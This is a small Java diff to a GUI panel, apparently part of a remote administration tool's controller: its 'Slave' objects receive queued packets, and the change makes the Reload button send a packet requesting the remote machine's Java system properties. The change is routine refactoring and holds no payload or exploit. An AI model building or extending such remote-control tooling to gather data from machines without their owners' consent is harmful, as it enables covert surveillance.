@@ -17,6 +17,7 @@ import javax.swing.table.DefaultTableModel;
 
 import com.redpois0n.Slave;
 import com.redpois0n.packets.OutgoingHeader;
+import com.redpois0n.packets.outgoing.Packet61SystemJavaProperties;
 
 @SuppressWarnings("serial")
 public class PanelControlJVM extends PanelControlParent {
@@ -31,7 +32,6 @@ public class PanelControlJVM extends PanelControlParent {
 	public PanelControlJVM(Slave sl) {
 		super(sl);
 		this.slave = sl;
-		final Slave slave = sl;
 		JPanel panel = new JPanel();
 		panel.setBorder(BorderFactory.createTitledBorder("Raw data"));
 		GroupLayout groupLayout = new GroupLayout(this);
@@ -46,7 +46,7 @@ public class PanelControlJVM extends PanelControlParent {
 		btnReload.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				clear();
-				slave.addToSendQueue(OutgoingHeader.GET_JVM_PROPERTIES);
+				slave.addToSendQueue(new Packet61SystemJavaProperties());
 			}
 		});
 
